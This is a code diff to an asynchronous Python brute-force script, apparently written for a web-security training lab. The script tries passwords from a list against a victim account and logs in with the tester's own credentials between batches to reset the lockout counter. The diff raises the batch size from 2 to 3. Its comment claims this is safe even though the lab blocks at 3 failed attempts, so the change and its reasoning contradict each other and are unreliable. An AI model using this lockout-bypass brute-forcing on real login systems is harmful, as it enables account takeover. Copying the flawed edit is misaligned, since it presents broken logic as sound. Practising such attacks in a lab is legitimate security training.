@@ -208,9 +208,9 @@ import asyncio
 import aiohttp
 import sys
 
-# Configuration: Try 2 passwords before 1 reset. 
-# (Lab blocks at 3 failed attempts, so 2 is safe and fast).
-BATCH_SIZE = 2  
+# Configuration: Try 3 passwords before 1 reset. 
+# (Lab blocks at 3 failed attempts, so 3 is safe and fast).
+BATCH_SIZE = 3  
 RESET_USER = "wiener"
 RESET_PASS = "peter"
 
@@ -246,7 +246,7 @@ async def exploit(url, victim_user, password_file):
     print(f"[*] Victim: {victim_user} | Batch Size: {BATCH_SIZE}")
 
     async with aiohttp.ClientSession() as session:
-        # Process passwords in chunks of 2
+        # Process passwords in chunks of 3
         for i in range(0, len(passwords), BATCH_SIZE):
             batch = passwords[i : i + BATCH_SIZE]
             
